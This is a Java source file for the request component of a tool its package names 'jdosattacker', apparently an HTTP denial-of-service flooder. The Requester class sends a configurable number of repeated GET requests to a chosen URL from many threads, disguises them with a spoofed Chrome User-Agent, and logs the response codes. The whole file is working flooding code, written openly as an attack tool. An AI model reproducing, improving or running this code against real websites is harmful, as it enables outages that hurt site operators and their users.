package com.anas.jdosattacker.request;

import com.anas.jdosattacker.Main;
import com.anas.jdosattacker.MainController;
import com.anas.jdosattacker.tui.LoggItem;
import com.anas.jdosattacker.tui.MainTUI;

import javax.net.ssl.HttpsURLConnection;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class Requester implements Runnable {
    public static int CONNECT_TIMEOUT = 5000;
    public static String USER_AGENT =
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
            REQUEST_METHOD = "GET";
    public static String url = "";
    private static int reqNumber;

    protected void sendRequest() {
        try {
            HttpURLConnection connection = switch (url.substring(0, 7)) {
                case "http://" -> (HttpURLConnection) new URL(url).openConnection();
                case "https:/" -> (HttpsURLConnection) new URL(url).openConnection();
                default -> throw new IllegalArgumentException("Invalid URL");
            };
            connection.setRequestMethod(REQUEST_METHOD);
            connection.setRequestProperty("User-Agent", USER_AGENT);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(false);
            connection.setConnectTimeout(CONNECT_TIMEOUT);
            connection.connect();
            int responseCode = connection.getResponseCode();
            Main.mainTUI.log(String.format("%15s | %16s |  %20s\n", responseCode +
                    (responseCode == HttpsURLConnection.HTTP_OK ? " [OK]" : " [FAIL]"),
                    Thread.currentThread().getName(),
                    System.currentTimeMillis() + "ms"));
        } catch (IOException e) {
            Main.mainTUI.log(String.format("%15s | %16s |  %20s \n", "[FAIL]",
                    Thread.currentThread().getName(),
                    System.currentTimeMillis() + "ms"));
        }
    }

    private void startRequests() {
        for (int i = 0; i < reqNumber; i++) {
            sendRequest();
        }
    }



    public static int getReqNumber() {
        return reqNumber;
    }

    public static void setReqNumber(int reqNumber) {
        Requester.reqNumber = reqNumber;
    }

    @Override
    public void run() {
        startRequests();
    }
}
